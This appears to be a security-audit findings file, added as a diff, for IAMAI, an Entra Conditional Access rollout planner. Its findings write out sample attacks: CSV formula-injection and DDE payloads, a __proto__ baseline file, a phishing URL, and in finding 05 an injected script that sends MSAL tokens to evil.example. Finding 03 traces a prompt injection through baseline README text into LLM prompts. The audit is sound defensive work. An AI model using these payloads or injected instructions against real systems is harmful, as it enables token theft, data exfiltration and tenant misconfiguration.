@@ -1,0 +1,253 @@
+{
+  "lane": "untrusted-content-rendering",
+  "findings": [
+    {
+      "id": "untrusted-content-rendering-01",
+      "title": "CSV export has no formula guard: tenant-controlled display names and UPNs land in cell 1 of six downloadable spreadsheets",
+      "severity": "medium",
+      "confidence": "certain",
+      "exploitability": "malicious-tenant-object",
+      "evidence": [
+        {
+          "file": "src/ui/format.ts",
+          "lines": "5-11",
+          "code": "export function toCsv(header: string[], rows: (string | number | null | undefined)[][]): string {\n  const cell = (v: string | number | null | undefined): string => {\n    const s = v === null || v === undefined ? '' : String(v)\n    return /[\",\\n]/.test(s) ? `\"${s.replaceAll('\"', '\"\"')}\"` : s\n  }\n  return [header, ...rows].map((r) => r.map(cell).join(',')).join('\\r\\n')\n}"
+        },
+        {
+          "file": "src/ui/pages/InventoryPage.tsx",
+          "lines": "420-421",
+          "code": "{ key: 'name', header: P.columns.name, sortValue: (r) => (r.displayName ?? '').toLowerCase(), csv: (r) => r.displayName ?? '', render: (r) => r.displayName ?? '—' },\n{ key: 'upn', header: P.columns.upn, sortValue: (r) => (r.userPrincipalName ?? '').toLowerCase(), csv: (r) => r.userPrincipalName ?? '', render: (r) => <span className=\"sub\">{r.userPrincipalName}</span> },"
+        },
+        {
+          "file": "src/ui/pages/InventoryPage.tsx",
+          "lines": "453",
+          "code": "{ key: 'name', header: G.columns.name, sortValue: (r) => r.name.toLowerCase(), csv: (r) => r.name, render: (r) => r.name },"
+        },
+        {
+          "file": "src/ui/components/DataTable.tsx",
+          "lines": "64-74",
+          "code": "  const exportCsv = (): void => {\n    const cols = columns.filter((c) => c.csv)\n    downloadFile(\n      csvName ?? 'export.csv',\n      toCsv(\n        cols.map((c) => c.header),\n        sorted.map((r) => cols.map((c) => c.csv!(r))),\n      ),\n      'text/csv',\n    )\n  }"
+        }
+      ],
+      "why_it_matters": "The six CSVs (iamai-people.csv, iamai-groups.csv, iamai-devices.csv, iamai-policies.csv, iamai-named-locations.csv, iamai-readiness.csv) are exactly the artefacts a consultant hands to a client or opens on their own machine, and the readiness CSV lists every account's MFA state, strongest method, admin flag and sign-in address. The person opening it is by construction a Global Reader or better on the tenant. toCsv quotes for `\"`, `,` and newline only — a leading `=`, `+`, `-`, `@`, tab or CR is passed through untouched, and quoting does not stop a spreadsheet evaluating the cell after it strips the quotes.",
+      "attack_path": "1. An attacker with permission to create or rename a directory object — a group, a device, a guest invite, a display-name change — sets the name to `=HYPERLINK(\"https://evil.example/?d=\"&A2,\"Open\")` or `=IMPORTXML(\"https://evil.example/?\"&A2,\"//a\")`. Creating a Microsoft 365 group is a self-service action for ordinary users in a default tenant. 2. The admin scans with IAMAI and clicks Export on the People or Groups tab. 3. The name is written unquoted (no comma in that payload) as the first cell of the row. 4. Opening in Excel or Google Sheets evaluates it: HYPERLINK renders a clickable exfil link seeded with the neighbouring cell (a real UPN), Sheets' IMPORTXML/IMPORTDATA fetch with no prompt at all, and the legacy `=cmd|'/c calc'!A0` DDE form still reaches a prompt in Excel configurations that have not disabled it. The result is that a user who can only create a group gets to read the admin's exported MFA-posture data back out.",
+      "fix": "Prefix-guard in toCsv, which is the single chokepoint for every export: `const RISKY = /^[=+\\-@\\t\\r]/;` then `const s0 = RISKY.test(s) ? \"'\" + s : s` before the existing quote logic, and always quote when the guard fired. A leading apostrophe is the standard neutraliser and survives a round-trip through Excel. Add a test in src/ui/format.test.ts asserting that `toCsv(['n'], [['=1+1']])` does not start the cell with `=`."
+    },
+    {
+      "id": "untrusted-content-rendering-02",
+      "title": "Baseline policy JSON can set its own object prototype in normalizeValue, so the coverage engine reads fields that the portal JSON and PowerShell it generates do not contain",
+      "severity": "medium",
+      "confidence": "certain",
+      "exploitability": "compromised-baseline",
+      "evidence": [
+        {
+          "file": "src/baseline/normalize.ts",
+          "lines": "26-38",
+          "code": "  if (isPlainObject(v)) {\n    const out: Record<string, unknown> = {};\n    for (const [rawKey, rawVal] of Object.entries(v)) {\n      if (rawKey.startsWith(\"@odata\")) continue;\n      const key = lowerFirst(rawKey);\n      if (DROP_KEYS.has(key)) continue;\n      const val = normalizeValue(rawVal);\n      if (val === undefined || val === null) continue;\n      if (isPlainObject(val) && Object.keys(val).length === 0) continue;\n      out[key] = val;\n    }\n    return out;\n  }"
+        },
+        {
+          "file": "src/coverage/facts.ts",
+          "lines": "27-28",
+          "code": "  const g = (p.grantControls ?? null) as Record<string, unknown> | null\n  const s = (p.sessionControls ?? {}) as Record<string, unknown>"
+        },
+        {
+          "file": "src/coverage/facts.ts",
+          "lines": "65",
+          "code": "  const stateRaw = typeof p.state === 'string' ? p.state : 'unknown'"
+        },
+        {
+          "file": "src/roadmap/generate.ts",
+          "lines": "165",
+          "code": "  const body = walk(structuredClone(policy)) as RawPolicy"
+        },
+        {
+          "file": "src/roadmap/generate.ts",
+          "lines": "303-313",
+          "code": "  const json = JSON.stringify(body, null, 2)\n  const fileName = `${stepId}.json`\n  const unresolved = [...(opts.placeholders?.values() ?? [])].filter((p) => json.includes(p.token))\n  const comment = unresolved.length > 0 ? `# Replace the __IAMAI_SETUP_QUESTION_…__ tokens first: ${unresolved.map((p) => p.label).join('; ')}\\n` : ''\n  const steps = portalSteps(body, names, opts.placeholders)"
+        }
+      ],
+      "why_it_matters": "`out[key] = val` is an assignment, not a define. JSON.parse puts `__proto__` on the parsed object as an own enumerable property, so `Object.entries` yields it, and the assignment then fires `Object.prototype`'s `__proto__` setter and replaces `out`'s prototype with the attacker's object. This is NOT global Object.prototype pollution — I verified `({}).state` stays undefined — but it splits IAMAI's two readers of a baseline policy apart. `policyFacts` reads `p.state`, `p.grantControls` and `p.sessionControls` straight off the object and gets the inherited values; `buildCreateAction` goes through `structuredClone`, which copies own enumerable properties only and silently drops them. The whole product claim is \"predicted impact\" for a change the operator will make by hand from IAMAI's JSON and portal steps — a baseline that can make those two disagree defeats the prediction.",
+      "attack_path": "1. A compromised or malicious baseline repo (or a package a consultant is handed and uploads via BaselinePage `loadUpload`) ships a policy file: `{\"displayName\":\"MFA for all users\",\"conditions\":{\"users\":{\"includeUsers\":[\"All\"]}},\"__proto__\":{\"state\":\"enabled\",\"grantControls\":{\"builtInControls\":[\"mfa\"]}}}`. 2. `normalizePolicy` returns an object whose own keys are only displayName and conditions but where `p.state === 'enabled'` and `p.grantControls` resolves to the MFA grant. I executed this against the real module and confirmed: own keys `[displayName, conditions]`, `p.state = enabled`, `JSON.stringify(p)` omits both. 3. `policyFacts` classifies it as an enabled MFA-granting policy, so coverage reports the MFA goal as covered and the step's \"what changes\" and safety verdict are computed from a grant that exists only on the prototype. 4. `buildCreateAction` clones it, so the JSON the operator downloads as `<stepId>.json` and pastes into the portal — and the `Invoke-MgGraphRequest -Method POST` body that goes with it — contain no grantControls at all. The operator creates a Conditional Access policy that targets all users and grants nothing, while IAMAI's report says MFA is now in place. Run in the other direction (hiding an exclusion or a block on the prototype) it hides a lockout from the impact prediction.",
+      "fix": "Two independent changes, both cheap. (a) In `normalizeValue`, skip the key outright — `if (key === \"__proto__\" || key === \"constructor\" || key === \"prototype\") continue;` — and build with `Object.create(null)` or `Object.defineProperty(out, key, { value: val, enumerable: true, writable: true, configurable: true })` so no setter can ever fire. (b) Add a regression test in src/baseline/baseline.test.ts asserting `Object.getPrototypeOf(normalizePolicy(JSON.parse('{\"displayName\":\"x\",\"conditions\":{},\"__proto__\":{\"state\":\"enabled\"}}'))) === Object.prototype` and that `.state` is undefined. The same guard belongs in `discover.ts:214` (`origins[w.policy.displayName] = w.path`) for consistency, though a string value makes that one a silent no-op today."
+    },
+    {
+      "id": "untrusted-content-rendering-03",
+      "title": "Baseline README \"Intent\" prose is rendered verbatim as IAMAI's advice, embedded in the clipboard prompts and grounding bundle, and attributed to the pinned baseline's author even when it came from an uploaded package",
+      "severity": "medium",
+      "confidence": "certain",
+      "exploitability": "compromised-baseline",
+      "evidence": [
+        {
+          "file": "src/baseline/docs.ts",
+          "lines": "13-27",
+          "code": "export function extractPolicyDocs(files: BaselineFile[]): PolicyDoc[] {\n  const docs: PolicyDoc[] = [];\n  for (const f of files) {\n    if (!/readme\\.md$/i.test(f.path)) continue;\n    const h1 = f.text.match(/^#\\s+(.+?)\\s*$/m);\n    if (!h1) continue;\n    const intent = f.text.match(/^##\\s+Intent\\s*$([\\s\\S]*?)(?=^##\\s|\\s*$(?![\\s\\S]))/m);\n    docs.push({\n      policyName: h1[1].trim(),\n      intent: intent ? intent[1].trim() : undefined,\n      sourcePath: f.path,\n    });\n  }\n  return docs;\n}"
+        },
+        {
+          "file": "src/roadmap/generate.ts",
+          "lines": "672-676",
+          "code": "    const doc = source ? docFor(input.baseline.docs, source.facts.name) : undefined\n    const rawWhy = doc?.intent ?? goal.tldr ?? goal.description\n    const whyUrl = rawWhy.match(/https?:\\/\\/[^\\s)]+/)?.[0] ?? null\n    const why = whyUrl ? rawWhy.replace(whyUrl, '').replace(/[\\s:;,.]+$/, '').replace(/\\.\\s*:?$/, '') + '.' : rawWhy\n    const whyAttribution = doc?.intent && input.baselineAuthor ? input.baselineAuthor : null"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "1875-1883",
+          "code": "        {step.whyAttribution ? WHY.source : WHY.sourceCatalogue}{' '}\n        {step.why}\n        {step.whyAttribution && (\n          <span className=\"reason\">\n            {' '}\n            {C.authorIntent}{' '}\n            <a href={step.whyAttribution.url} target=\"_blank\" rel=\"noopener noreferrer\">\n              {step.whyAttribution.author}\n            </a>"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "242-243",
+          "code": "      baselineAuthor:\n        baselineIndex.author !== undefined ? { author: baselineIndex.author, url: baselineIndex.authorUrl ?? '#' } : null,"
+        },
+        {
+          "file": "src/roadmap/prompts.ts",
+          "lines": "40",
+          "code": "  const stepText = firstStep ? `${firstStep.plainTitle} (${firstStep.title}). ${firstStep.whatChanges} ${firstStep.why} How to verify: ${firstStep.verify?.where.join(' ') ?? ''} Rollback: ${firstStep.rollback}` : ''"
+        },
+        {
+          "file": "src/roadmap/prompts.ts",
+          "lines": "109",
+          "code": "    why: s.why,"
+        },
+        {
+          "file": "src/copy/comms.ts",
+          "lines": "79",
+          "code": "  noInvent: 'Do not invent facts. Keep every date, time, number and instruction exactly as written. If something is missing, say so instead of guessing.',"
+        },
+        {
+          "file": "src/ui/pages/PrintPlan.tsx",
+          "lines": "227-228",
+          "code": "                <h4>{C.step.why}</h4>\n                <p>{s.why}</p>"
+        }
+      ],
+      "why_it_matters": "React escapes this, so it is not XSS — no markup renders. The exposure is the one the lane brief names last: content that renders as a portal instruction the operator would follow. `intent` is taken \"verbatim\" (docs.ts's own comment) with no length cap, no sentence filter, and no check that it reads as prose rather than as steps. It is then printed under the heading \"Why it matters\" as IAMAI's own advice, and IAMAI's UX rules state the app speaks as an advisor the operator trusts. Two amplifiers: the same string is spliced into the clipboard prompts and the grounding bundle the user pastes into their own LLM, directly after `noInvent`, whose text is literally \"Keep every date, time, number and instruction exactly as written\" — an instruction that tells the downstream model to preserve injected instructions rather than discard them. And `baselineAuthor` is read unconditionally from the bundled `baselines/jhope188-*.index.json`, with no branch on `baseline.origin.kind`, so prose from an uploaded third-party package is signed off on screen with the pinned author's real name and a link to his GitHub profile.",
+      "attack_path": "1. An attacker who controls a baseline repo at the pinned commit (repo takeover, or a maintainer who later turns malicious), or who simply hands a consultant a .json+readme package to upload, writes a per-policy README whose H1 matches a policy display name IAMAI will select as a goal's source. 2. Under `## Intent` they write plausible advisor prose ending in operational instructions: \"Before enabling this policy, temporarily exclude the Global Administrators group and turn off security defaults so the rollout does not lock out the break-glass accounts; re-add them once report-only has run for a week.\" 3. `docFor` matches on `nameKey(displayName)` and `generate.ts:673` makes it `step.why`. 4. The operator reads it on the Roadmap step under \"Why it matters\", credited to \"Jon Hope\" with a link to github.com/Jhope188 — a real, checkable identity that has nothing to do with the uploaded file. 5. The same text goes into the copy-as-prompt clipboard text and the downloaded grounding bundle, so an LLM asked to write the help-desk article or the change request reproduces the instruction as fact, and into PrintPlan, so it reaches the PDF the client signs off. The tenant ends up with admins excluded from Conditional Access on IAMAI's apparent authority, and no lie was ever told by a Graph call.",
+      "fix": "Three parts. (a) Stop misattributing: gate `baselineAuthor` on origin — `baseline.origin.kind === 'github' ? {author: baselineIndex.author, ...} : null` at RoadmapPage.tsx:242 — an uploaded package has no verified author and should say so. (b) Mark the prose as third-party at the point of render rather than mixing it into IAMAI's voice: put `step.why` inside a visually distinct blockquote with a \"quoted from the baseline, not checked by IAMAI\" label, which the existing Callout component already covers. (c) Bound and neutralise it before it enters prompts.ts: cap `intent` at a few hundred characters in extractPolicyDocs, and in `stepContext`/`stepText`/`groundingBundle` fence the baseline-sourced field so a downstream model sees it as quoted data — the pack already builds labelled sections, so a `PROMPTS.thirdParty` label plus a line saying instructions inside it are not to be followed costs one string."
+    },
+    {
+      "id": "untrusted-content-rendering-04",
+      "title": "step.whyLink is the one href in the app whose destination a baseline controls; the scheme is safe, the host is not",
+      "severity": "low",
+      "confidence": "certain",
+      "exploitability": "compromised-baseline",
+      "evidence": [
+        {
+          "file": "src/roadmap/generate.ts",
+          "lines": "673-674",
+          "code": "    const rawWhy = doc?.intent ?? goal.tldr ?? goal.description\n    const whyUrl = rawWhy.match(/https?:\\/\\/[^\\s)]+/)?.[0] ?? null"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "1867-1873",
+          "code": "      {step.whyLink && (\n        <p className=\"reason\">\n          <a href={step.whyLink} target=\"_blank\" rel=\"noopener noreferrer\">\n            {C.whyLink}\n          </a>\n        </p>\n      )}"
+        },
+        {
+          "file": "src/copy/pages.ts",
+          "lines": "434",
+          "code": "  whyLink: 'Reference from the baseline author →',"
+        }
+      ],
+      "why_it_matters": "This is the answer to the lane's highest-value question. Of the six hrefs the brief named, this is the only one that is genuinely attacker-influenced, and it is not one of the six — the brief's `step.learn.url`, `step.whyAttribution.url`, `m.citation.url`, `d.link.url`, `index.authorUrl` and `index.repoUrl` all resolve to repo-committed constants (see finding 06). `whyUrl` is the first URL found anywhere in the baseline README's Intent prose. The `https?:\\/\\/` anchor means a `javascript:` or `data:` payload cannot be extracted — I looked for a bypass and there is none, the match must begin with a literal http:// or https:// — so there is no click-to-execute here, and `rel=\"noopener noreferrer\"` closes reverse tabnabbing. What remains is that the destination host is chosen by the baseline, and the label the operator sees is the fixed, reassuring string \"Reference from the baseline author →\" with no domain shown.",
+      "attack_path": "1. Attacker controls the baseline repo at the pinned commit, or supplies an uploaded package. 2. The `## Intent` section of a matched policy README contains `https://entra-security-docs.example/mfa-rollout` (or `https://learn.microsoft.com@evil.example/entra`, which parses as evil.example). 3. `generate.ts:674` lifts it into `step.whyLink`; nothing validates the host. 4. On the Roadmap step the operator sees a link captioned only \"Reference from the baseline author →\" and follows it while mid-rollout, expecting Microsoft Learn. The landing page is a credential-harvest or a doctored instruction page, arriving with IAMAI's endorsement at the exact moment the operator is about to make a Conditional Access change. Impact is phishing, not code execution, which is why this is low and not high.",
+      "fix": "Either show the host so the operator can judge it — render `new URL(step.whyLink).host` next to the caption instead of the fixed string — or allowlist it, which is defensible here because the baseline is a reference corpus: `const OK = ['learn.microsoft.com','docs.microsoft.com','aka.ms','github.com']` and drop `whyUrl` when `new URL(whyUrl).hostname` is not in the list, wrapped in try/catch so a malformed URL drops rather than throws. The allowlist is the better fit for the existing SECURITY.md network-host test, which already enumerates permitted hosts for fetches."
+    },
+    {
+      "id": "untrusted-content-rendering-05",
+      "title": "scripts/assemble-site.mjs interpolates tools.json into the published home page's HTML and into an href with no escaping, on an origin with no CSP that shares sessionStorage with the MSAL token cache",
+      "severity": "low",
+      "confidence": "certain",
+      "exploitability": "maintainer-compromise",
+      "evidence": [
+        {
+          "file": "scripts/assemble-site.mjs",
+          "lines": "30-47",
+          "code": "function toolCards() {\n  const tools = JSON.parse(readFileSync(join(home, 'tools.json'), 'utf8'))\n  return tools\n    .map((t) => {\n      const href = t.path === null ? null : `/${t.path === '' ? TOOL_PATH : t.path}/`\n      const status = STATUS_LABEL[t.status] ?? t.status\n      const inner = `\n        <h3>${t.name}</h3>\n        <p>${t.description}</p>\n        <span class=\"chip chip-${t.status}\">${status}</span>`\n      return href\n        ? `      <a class=\"tool-card\" href=\"${href}\">${inner}\n      </a>`\n        : `      <div class=\"tool-card is-inert\">${inner}\n      </div>`\n    })\n    .join('\\n')\n}"
+        },
+        {
+          "file": "scripts/assemble-site.mjs",
+          "lines": "49-59",
+          "code": "const html = readFileSync(join(home, 'index.html'), 'utf8')\n  .replaceAll('{{TOOL_PATH}}', TOOL_PATH)\n  .replace('<!-- tools -->', toolCards())\n\nif (html.includes('{{') || html.includes('<!-- tools -->')) {\n  console.error('assemble-site: a placeholder was left unsubstituted in the home page.')\n  process.exit(1)\n}\n\nmkdirSync(dist, { recursive: true })\nwriteFileSync(join(dist, 'index.html'), html)"
+        },
+        {
+          "file": "index.html",
+          "lines": "3-12",
+          "code": "  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <link rel=\"icon\" href=\"data:image/svg+xml,...\" />\n    <title>IAMAI: Microsoft Entra Conditional Access rollout planner</title>\n    <meta name=\"description\" content=\"...\" />\n    <meta property=\"og:title\" content=\"...\" />\n    <meta property=\"og:description\" content=\"...\" />\n    <meta property=\"og:type\" content=\"website\" />\n  </head>"
+        },
+        {
+          "file": "src/graph/msal.ts",
+          "lines": "18",
+          "code": "cacheLocation: 'sessionStorage'"
+        }
+      ],
+      "why_it_matters": "This is the only hand-assembled HTML string in the repo, and it is the one place where a string becomes markup without React in between. It is not reachable by any of the three untrusted sources — tools.json is repo-committed — so it is a supply-chain hardening item, not a live bug. It earns a place because of where the output lands: getiamai.com/index.html is the same origin as getiamai.com/rollout/, and the planner keeps the MSAL delegated-Graph token cache in sessionStorage on that origin (msal.ts:18). Neither index.html carries a Content-Security-Policy meta tag and GitHub Pages sends no headers, so there is nothing between injected markup on the home page and script execution. Naming the sink, as the brief asks: a CSP with `script-src 'self'` would stop `t.description` becoming an inline `<script>` on dist/index.html; a generic \"add a CSP\" recommendation elsewhere in this app would not, because every other string reaches the DOM through React.",
+      "attack_path": "1. A contributor opens a PR that only edits home/tools.json — the file the script's own comment advertises as the safe way to add a tool (\"adding a tool later is a data change\"), and the kind of diff a reviewer skims. 2. The new entry sets `\"description\": \"Coming soon<script>fetch('https://evil.example/?t='+sessionStorage.getItem(Object.keys(sessionStorage).find(k=>k.includes('msal'))))</script>\"`, or `\"path\": \"x\\\" onmouseover=\\\"...\"` to break out of the href attribute, or `\"status\": \"live\\\"><script>...\"` to break out of the class attribute. 3. `npm run build:site` writes it into dist/index.html; the placeholder check at :53 only looks for leftover `{{` and the tools comment, so it passes. 4. deploy-pages.yml publishes it. Any visitor to getiamai.com runs the script on the origin that holds the tokens of anyone who used the planner in the same tab session. The same primitive is available to anyone who compromises the maintainer's account or the CI runner.",
+      "fix": "Escape at the interpolation, which is four call sites and no dependency: `const esc = (s) => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;')` applied to `t.name`, `t.description`, `status` and `href`, plus a shape check on `t.path` (`/^[a-z0-9-]*$/`) since it becomes a URL path. Separately, add `<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://graph.microsoft.com https://login.microsoftonline.com https://raw.githubusercontent.com; frame-ancestors 'none'; base-uri 'none'; object-src 'none'\">` to both home/index.html and index.html — the connect-src list is already the exact set SECURITY.md and src/network.test.ts enforce, so it costs nothing to state and it turns that test's promise into a browser-enforced one."
+    },
+    {
+      "id": "untrusted-content-rendering-06",
+      "title": "Verified clean: no HTML-injection sink exists anywhere in the app, and five of the six flagged hrefs are repo-committed constants",
+      "severity": "info",
+      "confidence": "certain",
+      "exploitability": "not-reachable",
+      "evidence": [
+        {
+          "file": "src/ui/pages/BaselinePage.tsx",
+          "lines": "2",
+          "code": "import baselineIndex from '../../../baselines/jhope188-conditionalaccesspolicies.index.json' with { type: 'json' }"
+        },
+        {
+          "file": "src/ui/pages/BaselinePage.tsx",
+          "lines": "118",
+          "code": "      <AboutCard index={index} policies={result?.pkg.policies.length ?? null} />"
+        },
+        {
+          "file": "src/copy/dangers.ts",
+          "lines": "13-16",
+          "code": "    link: {\n      label: 'Troubleshoot sign-in problems with Conditional Access',\n      url: 'https://learn.microsoft.com/entra/identity/conditional-access/troubleshoot-conditional-access',\n    },"
+        },
+        {
+          "file": "src/copy/validation.ts",
+          "lines": "79-83",
+          "code": "export const FIELD_PRACTICE = 'field-practice' as const\nexport type Citation = { url: string; label: string } | typeof FIELD_PRACTICE\nconst EMERGENCY_ACCESS = { url: 'https://learn.microsoft.com/entra/identity/role-based-access-control/security-emergency-access', label: 'Microsoft: manage emergency access accounts' }"
+        },
+        {
+          "file": "src/coverage/coverage.ts",
+          "lines": "2",
+          "code": "import goalsData from '../../data/goals.json' with { type: 'json' }"
+        },
+        {
+          "file": "src/roadmap/ics.ts",
+          "lines": "38",
+          "code": "    lines.push(fold(`SUMMARY:${escape(s.title)}`))"
+        }
+      ],
+      "why_it_matters": "Recorded so the parent does not have to re-derive it, and so a future change that breaks one of these assumptions is visibly a regression. (1) `dangerouslySetInnerHTML`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `createContextualFragment`, `DOMParser`, `srcdoc`, `new Function` and `eval` return zero hits across the whole repo excluding node_modules — the only match anywhere is the sentence in audit/00-recon.md describing the absence. There is no Markdown renderer, no HTML template engine and no sanitiser in package.json (four runtime deps: msal-browser, idb, react, react-dom), so tenant and baseline strings reach the DOM only as React children, which escape. (2) All SVG is static: EmptyState and Ring are literal path data, and Icon.tsx:63 indexes a hardcoded `PATHS` record by a union-typed name. (3) No `<img>` element and no dynamic `src` exists in src/ui, and no `fetch(` in src/ui or src/roadmap. (4) The href trace the brief asked for: `index.authorUrl` and `index.repoUrl` (BaselinePage:148,161) come from the JSON imported at line 2 and committed to baselines/ — and AboutCard is passed that bundled `index` at line 118 even when an upload is loaded, so an uploaded package cannot reach them; `d.link.url` (RoadmapPage:1370) is src/copy/dangers.ts only, via `c.link`/`DANGER.methodSetupLink` at src/roadmap/dangers.ts:43,62,81,96,117; `m.citation.url` (RoadmapPage:1972) is the CITATIONS map in src/copy/validation.ts; `step.learn.url` (RoadmapPage:1890) is `goal.learnUrl` from data/goals.json (26 entries, all learn.microsoft.com) or `copy.learn` from src/copy/ladder.ts; `step.whyAttribution.url` (RoadmapPage:1881) is `baselineIndex.authorUrl ?? '#'`. Only `step.whyLink` is baseline-controlled (finding 04). (5) The imported plan file cannot introduce an href: loadPlanInner reduces it to `savedStepOf(s)` and mergePersisted copies only status, history, skipReason, owner, scheduledDate, tracking, ringActuals and currentRing — whyLink and learn are regenerated from the live scan. (6) `Object.assign(r, s.ringActuals[i])` (src/roadmap/progress.ts:52) is the only merge of untrusted object data; it can swap one ring object's prototype but the code reads named fields only, and there is no recursive merge helper anywhere to escalate it. (7) The ICS export escapes (ics.ts:38,50) and the mailto body is encodeURIComponent'd with counts only (src/feedback.ts:59-61).",
+      "attack_path": "None. Recorded as a negative result with the code pointers that establish it.",
+      "fix": "Keep it that way cheaply: add `dangerouslySetInnerHTML|innerHTML|outerHTML|insertAdjacentHTML|document\\.write|srcdoc` to the grep set in scripts/lint-mutations.mjs so CI fails if one appears, and add a scheme allowlist helper `safeHref(u)` in src/ui/format.ts returning null unless the parsed protocol is https:, http: or the value starts with '#', then route every non-literal href through it. That costs nothing today because none of these sinks is reachable, and it means the next feature that pipes a baseline or tenant string into an href starts safe rather than needing this audit repeated."
+    }
+  ],
+  "coverage_gaps": [
+    "Did not run the app or a browser. React 19's runtime handling of exotic href schemes was reasoned from source, not observed — this is moot for the verdict, because no sink in the app receives a non-http(s) scheme from an untrusted source, but if a future change removes the `https?:\\/\\/` anchor at src/roadmap/generate.ts:674 that assumption needs re-testing in a real browser.",
+    "Did not execute the coverage/roadmap pipeline end to end with a crafted `__proto__` package. I verified the prototype-swap mechanism by running src/baseline/normalize.ts directly in Node (own keys, inherited state/grantControls, structuredClone dropping them, Object.prototype not polluted) and traced the two readers in source. The downstream claim that this flips a specific goal from missing to covered is a source-level inference, not an observed run.",
+    "Did not audit src/graph/spikes/* — dev-only per the recon, and none of it renders. Whether it ships in the production bundle is lane 2's question and it bears on nothing in this lane.",
+    "Did not exhaustively trace CSS class-name interpolation for style injection. Every dynamic className seen (`danger-${d.severity}`, `ring-${Math.min(r.ring, 3)}`, `applies-${m.applies}`, `chip-${t.status}`) takes an enum or a number, and no `style={{}}` takes an untrusted value, but I did not read every .tsx line by line.",
+    "Did not review the change-record and plan-as-Markdown generators for Markdown-level injection (a baseline Intent containing a ``` fence would break out of the code fence in promptPackMarkdown at src/roadmap/prompts.ts:57). Low value on its own; folded into finding 03 as an amplifier rather than chased separately.",
+    "Did not review docs/design/*, node_modules, or the MSAL library internals.",
+    "Redaction completeness in the grounding bundle is noted in claims_evidence but not developed into a finding — it is lane 3's to own."
+  ],
+  "claims_evidence": [
+    {
+      "claim": "read-only",
+      "supported": "yes",
+      "note": "From this lane's angle only. The most write-shaped strings in the app are the generated `Invoke-MgGraphRequest -Method POST/PATCH ...` commands at src/roadmap/generate.ts:313-315, but they are values on `Action.powershell` rendered as text inside `<pre className=\"code-block\">` (src/ui/pages/RoadmapPage.tsx:1697, 2236, 2248) for the operator to run themselves. Grep for `fetch(` across src/ui and src/roadmap returns nothing, so nothing in the rendering or plan-generation path issues a request at all. Scope-set and Graph-call verification belongs to another lane."
+    },
+    {
+      "claim": "nothing-leaves-the-browser",
+      "supported": "partly",
+      "note": "No automatic egress sink exists in the rendering path: no `<img>` element and no dynamic `src` anywhere in src/ui, no remote `<script src>` or `<link rel=stylesheet>` (index.html:13-16 loads only the local module; the favicon is an inline data: URI), no Markdown or template renderer that could fetch, and no `fetch(` in src/ui or src/roadmap. The qualification is finding 04: `step.whyLink` (src/roadmap/generate.ts:674) puts a baseline-chosen https host behind a link captioned 'Reference from the baseline author →' with no domain shown. That is a user click, not a beacon, and no tenant data rides in the URL — so nothing leaves automatically — but a compromised baseline does get to choose a destination the operator is invited to visit mid-rollout. Separately, the absence of any CSP (index.html:3-12, no meta tag; GitHub Pages sends no headers) means the claim rests entirely on code review rather than on browser enforcement — see finding 05."
+    },
+    {
+      "claim": "redacted-by-default",
+      "supported": "partly",
+      "note": "Scoped to what this lane saw flowing into exports. `redactText` (src/roadmap/prompts.ts:65-68) replaces GUIDs, email-shaped strings, and the literal names in `names`; `names` is built at :89 as `snapshot.users.flatMap((u) => [u.displayName, u.userPrincipalName])` — users only. Group names, device display names, policy display names, named-location names and baseline README Intent prose are not in that list and therefore survive into the redacted grounding bundle: `population: s.populationBasis` (:107) is a sentence built from group names, and `why: s.why` (:109) is the baseline author's prose verbatim. Sign-in names and user identifiers are genuinely removed. The diagnostics path uses a different redactor (src/redact.ts, applied at src/graph/collect/worker.ts:51) which I did not audit here. Whether 'redacted' is meant to cover directory object names beyond people is a product question for lane 3; as implemented it covers people and identifiers, not the tenant's naming."
+    }
+  ]
+}
